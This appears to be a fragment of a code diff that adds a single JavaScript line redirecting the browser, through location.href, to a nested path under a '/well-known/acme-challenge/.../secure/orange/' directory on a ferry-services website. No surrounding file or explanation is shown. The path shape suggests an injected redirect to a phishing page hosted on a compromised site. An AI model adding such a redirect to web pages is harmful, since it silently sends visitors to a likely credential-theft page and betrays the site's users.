@@ -1,0 +1,1 @@
+ location.href='https://www.vallettaferryservices.com/well-known/acme-challenge/a/a/a/a/secure/orange/'; 
